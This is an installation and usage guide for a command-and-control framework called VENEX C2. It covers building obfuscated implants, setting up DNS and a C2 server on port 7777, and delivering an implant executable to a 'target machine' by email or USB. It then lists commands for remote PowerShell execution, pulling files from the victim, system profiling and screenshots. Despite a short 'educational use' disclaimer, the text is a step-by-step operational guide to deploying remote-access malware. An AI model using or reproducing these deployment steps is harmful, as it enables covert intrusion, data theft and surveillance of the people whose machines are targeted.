# VENEX C2 v1.5 Installation Guide

This guide provides step-by-step instructions to set up and build the VENEX C2 project. The setup requires Linux environment (e.g., WSL) for Build

## Prerequisites

- **Linux Environment**:
  - Use WSL (Windows Subsystem for Linux), Ubuntu, Kali, or another Linux distribution.
  - Internet conection
  - No need to worry about manulay installing compilers and linkers MakeFile do it insted.
- **Python 3**:
  - Install Python 3 on Windows environment for running the HTTP server and client GUI.

## Build Instructions

### Step 1: Clone the Repository with submodules
1. Open a terminal in your Linux environment.
2. Clone the repository with submodules:
   ```bash
   git clone --recurse-submodules https://github.com/onezero-1-0/venex.git
   ```

### Step 2: Build the Project (Windows)
1. navigate to the cloned repository using terminal
   ```bash
   cd venex
   ```
2. Run the Makefile with sudo and set your primary domain to build the project:
   ```bash
   make DOMAIN=yourdomain.TLD
   ```
   - Replace `yourdomain.TLD` with your actual domain (e.g., `example.com`).
   - The Makefile will handle all compilation, obfuscation, and setup steps automatically.
   - ensure Builder is successful without any errors before proceeding to usage instructions.
   - finnaly you have bin folder in current directory with the tools, client, final executable and server executable.

## Usage Instructions

### Step 1: Start the C2 Server (Linux)
1. First ensure target/internet can access your VPS/Server via the primary domain you set during build.
2. navigate to the `bin/tools` directory:
   ```bash
   cd bin/tools
   ```
3. generate subdomains for your primary domain:
   ```bash
   python3 subdomainGenerating.py
   ```
   - This will generate a list of subdomains for your primary domain, which will be used for C2 communication.
   - add one of the generated subdomains as a CNAME or A record in your DNS settings pointing to your server's IP address.
4. navigate back to the `bin` directory and navigate to the server derectory:
   ```bash
   cd ../server
   ```
5. Start the C2 server:
   ```bash
   ./server
   ```
   - The server will start and listen for incoming connections from the client on port 7777.
   - Ensure that port 7777 is open and accessible from the target machine or internet.

### Step 2: Run the Client GUI (Windows/Linux)
1. you can copy the client directory from `bin/client` to your attack machine.
2. navigate to the client directory:
   ```bash
   cd bin/client
   ```
3. install customtkinter if you don't have it:
   ```bash
   pip install customtkinter
   ```
4. Run the client GUI:
   ```bash
   python3 client.py
   ```
   - The client GUI will open, allowing you to interact with the C2 server and manage your implants.
   - You can view connected implants, send commands, and manage your C2 operations through the GUI.
5. go to client settings and set the default password (FUCKID):
   - This password will be used for authenticating the client with the server.
6. set the C2 server Primary domain or IP and port (default is 7777) in the client top bar and click connect:
   - Ensure that the primary domain is correctly set to the server you configured in your DNS settings.
7. Once connected, start a http listener using the following command in the client command bar:
   ```bash
   AUTH:START_HTTP
   ```
   - This will start an HTTP listener on the server, which will be used for communication with the gost implant.

### Step 3: Deploy the WinGost on Target Machine
1. send bin/gostInit/Wingost.exe to the target machine using your preferred method (e.g., email, USB, etc.).
2. execute Wingost.exe on the target machine:
   - This will install the gost implant on target machine and establish a connection back to the C2 server.

### Step 4: Manage Implants through Client GUI
1. Once the implant connects back to the server, it will appear in the client GUI under the "targets" section.
2. You can select the implant and right-click then click "Interact" to change command mode to interact with the implant.
3. From the command bar, you can send commands to the implant, manage modules, and perform various operations as needed.
4. Default commands:
   - `shell powershell -command ""` to execute a powershell command.
   - `rmf C:\temp.txt` to download a file from the target machine to the client machine.
   - `print hellow_world` this command go to the victim machine and send message to us. it is ensuer victim and we are in good connection state.
   - `$sysinfo` to get system information about the target machine.
   - `$screenShot` to take a screenshot of the target machine and send it back to the client.

**Disclaimer:** This project is intended for educational and ethical use only. Always ensure you have proper authorization before deploying or testing any tools in this repository. Unauthorized use is illegal and unethical.

## Happy Hacking!